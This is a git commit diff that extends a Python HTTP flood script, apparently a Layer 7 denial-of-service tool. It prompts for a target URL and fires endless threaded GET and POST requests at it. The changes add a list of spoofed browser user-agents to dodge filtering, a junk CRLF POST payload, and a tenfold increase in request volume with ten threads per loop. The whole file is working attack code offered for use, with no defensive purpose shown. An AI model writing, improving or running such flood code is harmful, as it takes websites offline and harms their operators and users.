8819c4e4015dfb7a324bcf20dcef0576b09aabef
ACKER POSIDEN <94275268+dev17V@users.noreply.github.com>
2022-02-15 20:49:00 -0800

    Update L7.py

--- L7.py
+++ L7.py
@@ -11,11 +11,40 @@ start = time.perf_counter()
 
 url = str(input("URL: "))
 
-uagent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
+uagent = {
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 10.0; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.3; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
+    "Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4",
+    "Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0",
+    "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
+    "Mozilla/5.0 (Android 11; Mobile; rv:88.0) Gecko/88.0 Firefox/88.0",
+    "Mozilla/5.0 (Android 11; Mobile; rv:87.0) Gecko/87.0 Firefox/87.0",
+    "Mozilla/5.0 (Android 11; Mobile; rv:85.0) Gecko/85.0 Firefox/85.0"
+}
   
 headers = {
     "User-Agent":random.choice(uagent)
 }
+
+payload = "\n\r\n\r\n\r\r\n\r\n\r\n\n\r\n\r\n\r\r\n\r\n\r\n\n\r\n\r\n\r\r\n\r\n\r\n"
 
 def website():
   _ = True
@@ -24,17 +53,32 @@ def website():
     time.sleep(0.1)
     r = requests.get(url, headers=headers)
     r = requests.get(url)
+    p = requests.post(url, data=payload, headers=headers)
     print(r)
 website()
 
 v = True
 
 while v:
-  for _ in range(10):
+  for _ in range(100):
     t1 = threading.Thread(target=website)
-
     t1.start()
-
+    t2 = threading.Thread(target=website)
+    t2.start()
+    t3 = threading.Thread(target=website)
+    t3.start()
+    t4 = threading.Thread(target=website)
+    t4.start()
+    t5 = threading.Thread(target=website)
+    t5.start()
+    t6 = threading.Thread(target=website)
+    t6.start()
+    t7 = threading.Thread(target=website)
+    t7.start()
+    t8 = threading.Thread(target=website)
+    t8.start()
+    t9 = threading.Thread(target=website)
+    t9.start()
+    t10 = threading.Thread(target=website)
+    t10.start()
     finish = time.perf_counter()
-
-    print(f"Finished in {round(finish-start, 2)} second(s)")
